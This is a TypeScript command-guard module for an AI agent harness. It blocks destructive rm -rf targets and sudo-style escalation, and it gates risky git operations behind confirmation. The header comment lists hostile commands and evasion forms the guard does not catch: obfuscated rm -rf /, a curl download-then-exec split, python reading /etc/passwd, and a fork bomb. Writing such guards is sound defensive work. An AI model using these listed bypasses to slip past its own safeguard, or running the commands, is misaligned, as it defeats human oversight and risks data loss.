// Command-guard: the destructive/exfiltration/escalation pattern table
// plus the git policy (structural tokenizer, ratified conditional
// grammars). Pure — no Bun/Node APIs, no harness protocol shapes. The
// regex table and every git-conditional list are policy data
// (policy/command.toml, `rules.command.*`); this module owns the
// tokenizer and the algorithms that interpret that data, parameterized via
// createCommandChecker() — `checkBash`/`checkGit`/`classifyGitAllow` are
// that algorithm bound to the embedded baseline.
//
// Two git subcommands stay engine code under their own named functions
// (checkGitCheckoutNeedsConfirm / checkGitRestoreNeedsConfirm) rather than
// TOML: `checkout`'s pathspec detection and `restore`'s index-only form
// (`--staged` plus one or more pathspecs) both need real structural parsing
// (arbitrary positional counts, ref vs. pathspec shape) that none of the
// three declarative forms — ask_flags, safe_first_arg, safe_grammar — can
// express as data.
//
// ─── Known limits (this is a defense, not a sandbox) ─────────────────
// The Bash matcher operates on the literal command STRING. Anything that
// requires real shell semantics to interpret will slip through. Concrete
// vectors NOT detected by this module:
//
//   • Quoting: `rm -rf "/"`, `rm -rf '/'`
//   • Escaping: `rm -rf \/`
//   • Variable indirection: `D=/; rm -rf $D`
//   • Command substitution: `rm -rf $(echo /)`, `` rm -rf `echo /` ``
//   • Glob expansion: `rm -rf /???`
//   • Heredoc: `bash <<< "rm -rf /"`
//   • Download-then-exec split: `curl x>/tmp/s.sh && bash /tmp/s.sh`
//   • Native interpreters: `python -c "open('/etc/passwd').read()"`,
//     same for node, ruby, perl, etc.
//   • Renamed fork-bomb: `f(){f|f&};f` (signature-only match)
//
// Treat this as protection against accidental destruction and the most
// obvious exfiltration patterns — not against an adversarial caller.

import { BASELINE } from './policy/baseline.ts';
import { compileRules, firstMatch } from './policy/match.ts';
import type { AskFlagsRule, CommandGitPolicy, CommandPolicy, SafeFirstArgRule, SafeGrammarRule } from './policy/schema.ts';
import type { Verdict } from './types.ts';

export function hasRmRf(segment: string): boolean {
  // Both -r/-R/--recursive AND -f/-F/--force must appear in the segment.
  const hasR = /-[a-zA-Z]*[rR][a-zA-Z]*\b|--recursive\b/.test(segment);
  const hasF = /-[a-zA-Z]*[fF][a-zA-Z]*\b|--force\b/.test(segment);
  return hasR && hasF;
}

function isDangerousRmTarget(target: string, dangerousTargets: readonly RegExp[]): boolean {
  return dangerousTargets.some((re) => re.test(target));
}

function checkRmRfWith(cmd: string, dangerousTargets: readonly RegExp[]): Verdict | null {
  // Slice the command at command separators so we evaluate each rm
  // segment independently of surrounding pipes / chains.
  const rmSegments = cmd.match(/\brm\b[^;|&\n]*/g) ?? [];
  for (const seg of rmSegments) {
    if (!hasRmRf(seg)) continue;
    const tokens = seg.split(/\s+/).slice(1).filter((t) => t && !t.startsWith('-'));
    for (const target of tokens) {
      // Dangerous always wins; the RM_ALLOWED_TARGETS documented in
      // policy/command.toml is informative only and cannot override
      // system-path destruction (e.g. /etc/node_modules).
      if (isDangerousRmTarget(target, dangerousTargets)) {
        return {
          verdict: 'block',
          ruleId: 'rm-rf-dangerous',
          reason: `rm -rf targeting a dangerous path: ${target}`,
          target: cmd,
        };
      }
    }
  }
  return null;
}

export type WrapperOptionPolicy = {
  readonly flags: ReadonlySet<string>;
  readonly optionsWithArg: ReadonlySet<string>;
  readonly acceptsAssignments?: true;
};

// Tokenizer grammar, not security policy — how far a wrapper's OWN options
// extend before the wrapped command begins. Stays engine code: these are
// parsing rules for the structural tokenizer below, not a table of
// verdicts, and none of the three declarative git-conditional forms model
// "how many tokens does this prefix consume".
export const WRAPPER_OPTION_POLICIES: Readonly<Record<string, WrapperOptionPolicy>> = {
  rtk: { flags: new Set(), optionsWithArg: new Set() },
  proxy: { flags: new Set(), optionsWithArg: new Set() },
  command: { flags: new Set(['--']), optionsWithArg: new Set() },
  exec: { flags: new Set(['--']), optionsWithArg: new Set() },
  env: {
    flags: new Set(['--', '-i']),
    optionsWithArg: new Set(['-u']),
    acceptsAssignments: true,
  },
  nice: { flags: new Set(), optionsWithArg: new Set(['-n']) },
  time: { flags: new Set(['-p']), optionsWithArg: new Set() },
  builtin: { flags: new Set(), optionsWithArg: new Set() },
};

const PRIVILEGE_ESCALATION_REASON =
  'Privilege escalation tool (sudo/doas/pkexec/runas/please) — confirm manually outside the agent session';

// Tokens that may legitimately precede `git` at command position.
export const GIT_BENIGN_PREFIXES: ReadonlySet<string> = new Set([
  'rtk',
  'command',
  'exec',
  'env',
  'nice',
  'time',
  'builtin',
]);

const PRIVILEGE_BENIGN_PREFIXES: ReadonlySet<string> = new Set([
  ...GIT_BENIGN_PREFIXES,
  // `proxy` alone is accepted only for hard-deny escalation detection. Git
  // keeps requiring `rtk proxy` so ordinary arguments are not reclassified.
  'proxy',
]);

// git global options that consume the FOLLOWING token as their argument.
export const GIT_OPTS_WITH_ARG: ReadonlySet<string> = new Set([
  '-C',
  '-c',
  '--git-dir',
  '--work-tree',
  '--namespace',
  '--super-prefix',
  '--exec-path',
]);

// Canonical structural tokenizer for the git and privilege guards. Quotes
// and escapes preserve the resulting literal token value, while their
// contents never gain separator/comment/operator syntax. An unquoted `#`
// starts a comment only at a shell word boundary.
type ShellToken = Readonly<{
  value: string;
  kind: 'word' | 'bang-operator';
}>;

function tokenizeShellSegments(cmd: string): ShellToken[][] {
  const segments: ShellToken[][] = [];
  let tokens: ShellToken[] = [];
  let token = '';
  let tokenStarted = false;
  let tokenHasLiteralizingSyntax = false;
  let quote: '"' | '\'' | null = null;
  let comment = false;

  const flushToken = (): void => {
    if (!tokenStarted) return;
    tokens.push({
      value: token,
      kind: token === '!' && !tokenHasLiteralizingSyntax ? 'bang-operator' : 'word',
    });
    token = '';
    tokenStarted = false;
    tokenHasLiteralizingSyntax = false;
  };
  const flushSegment = (): void => {
    flushToken();
    if (tokens.length > 0) segments.push(tokens);
    tokens = [];
  };

  for (let i = 0; i < cmd.length; i++) {
    const ch = cmd[i]!;
    if (comment) {
      if (ch === '\n') {
        comment = false;
        flushSegment();
      }
      continue;
    }

    if (quote !== null) {
      if (ch === '\\' && quote === '"') {
        const escaped = cmd[i + 1];
        if (escaped !== undefined && /[$`"\\\n]/.test(escaped)) {
          if (escaped !== '\n') token += escaped;
          i++;
        } else {
          token += '\\';
        }
        continue;
      }
      if (ch === quote) {
        quote = null;
        continue;
      }
      token += ch;
      continue;
    }

    if (ch === '\\') {
      const escaped = cmd[i + 1];
      if (escaped === '\n') {
        i++;
        continue;
      }
      tokenStarted = true;
      tokenHasLiteralizingSyntax = true;
      if (escaped === undefined) token += '\\';
      else {
        token += escaped;
        i++;
      }
      continue;
    }
    if (ch === '"' || ch === '\'') {
      quote = ch;
      tokenStarted = true;
      tokenHasLiteralizingSyntax = true;
      continue;
    }
    if (ch === '#' && !tokenStarted) {
      comment = true;
      continue;
    }
    if (/\s/.test(ch) && ch !== '\n') {
      flushToken();
      continue;
    }
    if (/[;&|\n]/.test(ch)) {
      flushSegment();
      continue;
    }
    tokenStarted = true;
    token += ch;
  }
  flushSegment();
  return segments;
}

// Find the git subcommand in a single command segment, tolerating wrappers
// (`command git …`), env assignments (`GIT_SEQUENCE_EDITOR=… git …`), and global
// options (`git -C <path> …`). Returns null when the segment is not a git
// command (so `echo git push` is ignored — git is an argument, not the verb).
type GitCommand = { sub: string; rest: string[]; forceConfirm?: true; };

export function extractGitSubcommand(segment: string): GitCommand | null {
  const tokens = tokenizeShellSegments(segment)[0] ?? [];
  return extractGitSubcommandFromTokens(tokens);
}

function extractGitSubcommandFromTokens(
  tokens: readonly ShellToken[],
): GitCommand | null {
  const prefix = consumeCommandPrefixes(tokens);
  let i = prefix.index;
  if (prefix.ambiguous) {
    i = tokens.findIndex((token, index) => index >= prefix.index && (token.value === 'git' || token.value.endsWith('/git')));
    if (i === -1) return null;
  }
  if (i >= tokens.length) return null;
  const head = tokens[i]!.value;
  if (head !== 'git' && !head.endsWith('/git')) return null;
  i++;
  while (i < tokens.length && tokens[i]!.value.startsWith('-')) {
    i += GIT_OPTS_WITH_ARG.has(tokens[i]!.value) ? 2 : 1;
  }
  if (i >= tokens.length) return null;
  return {
    sub: tokens[i]!.value,
    rest: tokens.slice(i + 1).map((token) => token.value),
    ...(prefix.ambiguous ? { forceConfirm: true as const } : {}),
  };
}

function consumeCommandPrefixes(
  tokens: readonly ShellToken[],
  benignPrefixes: ReadonlySet<string> = GIT_BENIGN_PREFIXES,
): { readonly index: number; readonly ambiguous: boolean; } {
  let i = 0;

  const consumeBangOperators = (): void => {
    while (tokens[i]?.kind === 'bang-operator') i++;
  };

  consumeBangOperators();
  while (i < tokens.length) {
    const token = tokens[i];
    if (token === undefined) break;
    if (/^\w+=/.test(token.value)) {
      i++;
      continue;
    }
    if (!benignPrefixes.has(token.value)) break;
    i++;

    // `rtk proxy git …` — `proxy` is a subcommand OF rtk, benign ONLY right
    // after `rtk`; consume it so the git verb is still found (bypass fix).
    if (token.value === 'rtk' && tokens[i]?.value === 'proxy') i++;

    const policy = WRAPPER_OPTION_POLICIES[token.value];
    if (!policy) continue;
    while (i < tokens.length) {
      const option = tokens[i];
      if (option === undefined) break;
      if (policy.acceptsAssignments && /^\w+=/.test(option.value)) {
        i++;
        continue;
      }
      if (policy.flags.has(option.value)) {
        i++;
        if (option.value === '--') break;
        continue;
      }
      if (policy.optionsWithArg.has(option.value)) {
        if (i + 1 >= tokens.length) return { index: i, ambiguous: true };
        i += 2;
        continue;
      }
      if (option.value.startsWith('-')) return { index: i, ambiguous: true };
      break;
    }
    if (token.value === 'time') consumeBangOperators();
  }
  return { index: i, ambiguous: false };
}

function isCommandNamed(token: string | undefined, names: ReadonlySet<string>): boolean {
  if (token === undefined) return false;
  const basename = token.slice(token.lastIndexOf('/') + 1);
  return names.has(basename);
}

function checkPrivilegeEscalationWith(cmd: string, privilegeCommands: ReadonlySet<string>): Verdict | null {
  for (const tokens of tokenizeShellSegments(cmd)) {
    const prefix = consumeCommandPrefixes(tokens, PRIVILEGE_BENIGN_PREFIXES);
    const index = prefix.ambiguous
      ? tokens.findIndex((token, tokenIndex) =>
        tokenIndex >= prefix.index
        && isCommandNamed(token.value, privilegeCommands)
      )
      : prefix.index;
    if (
      index === -1
      || !isCommandNamed(tokens[index]?.value, privilegeCommands)
    ) continue;
    return {
      verdict: 'block',
      ruleId: 'sudo',
      reason: PRIVILEGE_ESCALATION_REASON,
      target: cmd,
    };
  }
  return null;
}

export function isGitConfigRead(cmdOrRest: string | readonly string[], configReadModes: readonly string[]): boolean {
  if (typeof cmdOrRest !== 'string') {
    return configReadModes.includes(cmdOrRest[0] ?? '');
  }

  const segments = tokenizeShellSegments(cmdOrRest);
  const configCommands = segments
    .map(extractGitSubcommandFromTokens)
    .filter((parsed): parsed is GitCommand => parsed?.sub === 'config');
  return configCommands.length > 0
    && configCommands.every((parsed) => parsed.forceConfirm !== true && configReadModes.includes(parsed.rest[0] ?? ''));
}

const GIT_REMOTE_URL_KEY = /^remote\.[^\s]+\.url$/;

export function hasUnsafeGitConfigRemoteUrl(cmd: string, configReadModes: readonly string[]): boolean {
  for (const tokens of tokenizeShellSegments(cmd)) {
    const gitIndex = tokens.findIndex((token) => token.value === 'git' || token.value.endsWith('/git'));
    if (
      gitIndex === -1
      || !tokens.slice(gitIndex + 1).some((token) => token.value === 'config')
    ) continue;
    if (!tokens.some((token) => GIT_REMOTE_URL_KEY.test(token.value))) continue;

    const parsed = extractGitSubcommandFromTokens(tokens);
    if (
      parsed?.sub !== 'config'
      || parsed.forceConfirm === true
      || !isGitConfigRead(parsed.rest, configReadModes)
    ) return true;
  }
  return false;
}

// Positional (non-flag) arguments, ignoring shell redirection tokens
// (`2>`, `2>/dev/null`, `>out`, `<in`) that survive segment splitting.
function positionalArgs(rest: readonly string[]): string[] {
  return rest.filter((t) => !t.startsWith('-') && !/[<>]/.test(t));
}

// The two subcommands the declarative vocabulary cannot express — see the
// module header. Both keep exactly the original engine logic; only the
// name changed (they were inline branches of gitSubcommandNeedsConfirm).

function checkGitCheckoutNeedsConfirm(rest: readonly string[]): boolean {
  // Branch switching and branch creation are safe (git refuses to clobber
  // a dirty tree); the PATHSPEC form overwrites local edits and asks.
  if (rest.some((t) => t === '--' || /^(-f|--force|-B|--ours|--theirs|-p|--patch)$/.test(t))) {
    return true;
  }
  const positionals = positionalArgs(rest);
  // Explicit pathspec shapes: `.`, `..`, `./x`, globs.
  if (positionals.some((t) => /^\.{1,2}(\/|$)/.test(t) || /[*?[]/.test(t))) return true;
  // Without a create flag, two positionals mean `checkout <ref> <file>`.
  const creates = rest.some((t) => /^(-b|-t|--track|--detach|--orphan)$/.test(t));
  return !creates && positionals.length > 1;
}

function checkGitRestoreNeedsConfirm(rest: readonly string[]): boolean {
  // The ratified index-only form is `--staged` followed by one or more
  // pathspecs: it only ever touches the index (unstage), never the
  // working tree, and is trivially reversible with `git add` — N explicit
  // paths is no riskier than the single-path form. A preceding option can
  // consume `--staged` (so it must be rest[0]), a lone `--` separator right
  // after it is allowed (bash-faithful), and any other option among the
  // pathspecs needs explicit review.
  if (rest[0] !== '--staged') return true;
  const pathspecs = rest[1] === '--' ? rest.slice(2) : rest.slice(1);
  // Not positionalArgs(): that filter DROPS `-`-prefixed tokens before
  // counting; here a `-`-prefixed token among the pathspecs is exactly
  // what must trip confirm, so every token counts.
  return pathspecs.length === 0 || pathspecs.some((t) => t.startsWith('-'));
}

// The interpreter for the three declarative git-conditional forms (see
// policy/schema.ts). `checkout` and `restore` fall through to the two
// named engine functions above; every other subcommand not in
// `safe_subcommands` and not covered by any declarative entry is the
// catch-all — push, rebase, reset, clean, bisect, cherry-pick, revert, gc,
// rm, filter-branch/filter-repo, … — and always needs confirmation.
function gitSubcommandNeedsConfirm(sub: string, rest: readonly string[], git: CommandGitPolicy): boolean {
  if (git.safe_subcommands.includes(sub)) return false;

  const askFlags = git.ask_flags.find((e: AskFlagsRule) => e.sub === sub);
  if (askFlags) {
    if (rest.some((t) => askFlags.flags.includes(t))) return true;
    if (askFlags.max_positionals !== undefined && positionalArgs(rest).length > askFlags.max_positionals) {
      return true;
    }
    return false;
  }

  const safeFirstArg = git.safe_first_arg.find((e: SafeFirstArgRule) => e.sub === sub);
  if (safeFirstArg) {
    if (rest.length === 0) return !safeFirstArg.safe_when_absent;
    const inList = safeFirstArg.values.includes(rest[0]!);
    const safe = safeFirstArg.invert ? !inList : inList;
    return !safe;
  }

  const safeGrammar = git.safe_grammar.find((e: SafeGrammarRule) => e.sub === sub);
  if (safeGrammar) {
    const matches = safeGrammar.sequences.some((seq) => {
      if (seq.length !== rest.length) return false;
      return seq.every((tok, i) => tok === '*' ? !rest[i]!.startsWith('-') : tok === rest[i]);
    });
    return !matches;
  }

  if (sub === 'checkout') return checkGitCheckoutNeedsConfirm(rest);
  if (sub === 'restore') return checkGitRestoreNeedsConfirm(rest);

  return true;
}

function checkGitWith(cmd: string, git: CommandGitPolicy): Verdict | null {
  for (const tokens of tokenizeShellSegments(cmd)) {
    const parsed = extractGitSubcommandFromTokens(tokens);
    if (!parsed) continue;
    if (parsed.forceConfirm || gitSubcommandNeedsConfirm(parsed.sub, parsed.rest, git)) {
      return {
        verdict: 'confirm',
        ruleId: 'git-protected',
        reason: `git ${parsed.sub} can rewrite history, mutate a remote, or discard work — confirm before running`,
        target: cmd,
      };
    }
  }
  return null;
}

// Additive, log-only classification: identifies a git command allowed
// because a NAMED conditional rule decided it (e.g. `pull --ff-only`'s
// ratified grammar), as opposed to an unconditional safe_subcommands
// membership where no rule "fired" in any interesting sense. Never affects
// the permission decision — checkGit already returned null (allow) before a
// caller has any reason to call this. Exists purely so the adapter's audit
// log can record which conditional rules "silently earn their keep" and
// which never fire (spec User Story 10), without checkGit itself growing a
// third return shape that every existing caller and fixture would have to
// account for.
function classifyGitAllowWith(cmd: string, git: CommandGitPolicy): Verdict | null {
  for (const tokens of tokenizeShellSegments(cmd)) {
    const parsed = extractGitSubcommandFromTokens(tokens);
    if (!parsed || parsed.forceConfirm) continue;
    if (gitSubcommandNeedsConfirm(parsed.sub, parsed.rest, git)) continue;
    if (git.safe_subcommands.includes(parsed.sub)) continue;
    return {
      verdict: 'observe',
      ruleId: `git-conditional-${parsed.sub}`,
      reason: `git ${parsed.sub} matched its conditional allow grammar (safe form) — logged for audit`,
      target: cmd,
    };
  }
  return null;
}

export interface CommandChecker {
  readonly checkBash: (cmd: string) => Verdict | null;
  readonly checkGit: (cmd: string) => Verdict | null;
  readonly classifyGitAllow: (cmd: string) => Verdict | null;
}

/**
 * Builds {checkBash, checkGit, classifyGitAllow} bound to the given policy
 * (baseline, or a merged baseline+overlay+override set from
 * src/policy/load.ts).
 */
export function createCommandChecker(policy: CommandPolicy): CommandChecker {
  const compiledBash = compileRules(policy.bash);
  const dangerousTargets = policy.rm_rf.dangerous_targets.map((pattern) => new RegExp(pattern));
  const privilegeCommands = new Set(policy.privilege_escalation.commands);
  const git = policy.git;

  const checkGit = (cmd: string): Verdict | null => checkGitWith(cmd, git);
  const classifyGitAllow = (cmd: string): Verdict | null => classifyGitAllowWith(cmd, git);

  const checkBash = (cmd: string): Verdict | null => {
    if (!cmd) return null;

    // Special-cased: rm -rf needs allowlist logic before generic regex.
    const rmHit = checkRmRfWith(cmd, dangerousTargets);
    if (rmHit) return rmHit;

    const privilegeHit = checkPrivilegeEscalationWith(cmd, privilegeCommands);
    if (privilegeHit) return privilegeHit;

    // Hard-block rules take priority over the git "confirm" guard.
    const hit = firstMatch(compiledBash, cmd, 'block');
    if (hit) return hit;

    // Protected git operations → interactive prompt ("confirm").
    return checkGit(cmd);
  };

  return { checkBash, checkGit, classifyGitAllow };
}

const BASELINE_CHECKER = createCommandChecker(BASELINE.rules.command);

/** Uses the embedded baseline's command policy. */
export const checkBash = BASELINE_CHECKER.checkBash;
/** Uses the embedded baseline's git conditional policy. */
export const checkGit = BASELINE_CHECKER.checkGit;
/** Uses the embedded baseline's git conditional policy. */
export const classifyGitAllow = BASELINE_CHECKER.classifyGitAllow;

// Backward-compatible standalone exports (tests exercise checkRmRf directly).
export function checkRmRf(cmd: string): Verdict | null {
  return checkRmRfWith(cmd, BASELINE.rules.command.rm_rf.dangerous_targets.map((p) => new RegExp(p)));
}
export function checkPrivilegeEscalation(cmd: string): Verdict | null {
  return checkPrivilegeEscalationWith(cmd, new Set(BASELINE.rules.command.privilege_escalation.commands));
}

/** The embedded baseline's unconditionally-safe git subcommands. */
export const SAFE_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set(BASELINE.rules.command.git.safe_subcommands);
/** The embedded baseline's privilege-escalation tool names. */
export const PRIVILEGE_ESCALATION_COMMANDS: ReadonlySet<string> = new Set(
  BASELINE.rules.command.privilege_escalation.commands,
);
